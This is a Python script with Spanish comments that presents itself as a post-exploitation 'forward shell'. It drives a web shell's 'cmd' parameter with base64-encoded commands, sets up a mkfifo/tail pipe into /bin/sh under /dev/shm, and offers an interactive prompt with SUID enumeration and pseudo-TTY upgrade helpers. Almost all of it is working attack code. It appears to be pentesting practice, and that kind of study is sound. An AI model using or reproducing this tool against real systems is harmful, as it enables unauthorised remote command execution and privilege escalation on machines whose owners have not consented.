#!/usr/bin/env python3

'''
    Las forward shells son una técnica de post-explotación que permiten a un atacante interactuar con una máquina comprometida de forma remota.
    
    Las diferencias entre una reverse shell y una forward shell son:
        - En una reverse shell, la máquina comprometida se conecta al atacante.
        - En una forward shell, el atacante se conecta a la máquina comprometida.
    
    Puede ser que el firewall de la máquina comprometida bloquee las conexiones entrantes, por lo que una forward shell puede ser una buena alternativa.
    
    En este script, vamos a crear una forward shell que se conecte a un servidor remoto y que permita al atacante ejecutar comandos en la máquina comprometida.
'''

# playing with mkfifo

import requests
from termcolor import colored
from base64 import b64encode
from random import randrange
import time

class ForwardShell:
    
    def __init__(self):
        
        session = randrange(1000, 9999)
        self.main_url = f"http://localhost/index.php"
        self.stdin = f"/dev/shm/input_{session}"
        self.stdout = f"/dev/shm/output_{session}"
        self.is_pseudo_tty = False
        self.help_options = { 'enum suid' : 'Muestra los archivos con el bit SUID activado' , 
                            'help': 'Muestra este mensaje de ayuda', 
                            'exit' : 'Salir de la terminal interactiva'}

    def run_command(self, command):
        
        command = b64encode(command.encode()).decode() # Codificamos el comando en base64
        
        # Comando a ejecutar
        data = {
            'cmd' : 'echo "%s" | base64 -d | /bin/sh' % command
        }
        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text
        except:
            pass
        return None

    def setup_shell(self):
        
        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout)
        self.run_command(command)
        print(colored('[+] Shell creada', 'green'))
        
    def remove_data(self):
        self.run_command(f"/bin/rm {self.stdin} {self.stdout}")
        print(colored('[+] Datos eliminados', 'green'))
        
    def write_stdin(self, command):
        command = b64encode(command.encode()).decode()
        
        data = {
            'cmd' : 'echo "%s" | base64 -d > %s' % (command, self.stdin)
        }
        
        r = requests.get(self.main_url, params=data)
        
    def read_stdout(self):
        
        for _ in range(5):
            read_stdo_cmd = f"/bin/cat {self.stdout}"
            output = self.run_command(read_stdo_cmd)
            time.sleep(0.2)

        return output

    def clear_stdout(self):
        clear_stdout_cmd = f"echo '' > {self.stdout}"
        self.run_command(clear_stdout_cmd)
        
# mkfifo input; tail -f input | /bin/sh 2&>1 > output

    def run(self):
        
        self.setup_shell()
        
        while True: 
            command = input(colored('> ', 'yellow'))
            
            if "script /dev/null -c bash" in command:
                print(colored("\n[i] se ha iniciado una pseudo-terminal\n", 'blue'))
                self.is_pseudo_tty = True
            
            if command.strip() == "enum suid":
                command = "find / -perm -4000 2>/dev/null | xargs ls -l "
            
            if command.strip() == "help":
                for option, description in self.help_options.items():
                    print(colored(f"[+] {option} : {description}", 'blue'))
                continue
            
            if command.strip() == "pseudo-terminal":
                command = "script /dev/null -c bash"
            
            self.write_stdin(command + "\n")
            output = self.read_stdout()
            
            if command.strip() == "exit":
                self.is_pseudo_tty = False
                self.clear_stdout()
                print(colored("\n[!] Saliendo de la terminal interactiva \n", 'red'))
                continue
            
            
            if self.is_pseudo_tty:
                lines = output.split('\n')
                
                if len(lines) == 2:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1])
                
                elif len(lines) > 2:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])
                
                print(cleared_output + '\n')
                
            else:
                print(output)
            
            self.clear_stdout()

# script /dev/null -c bash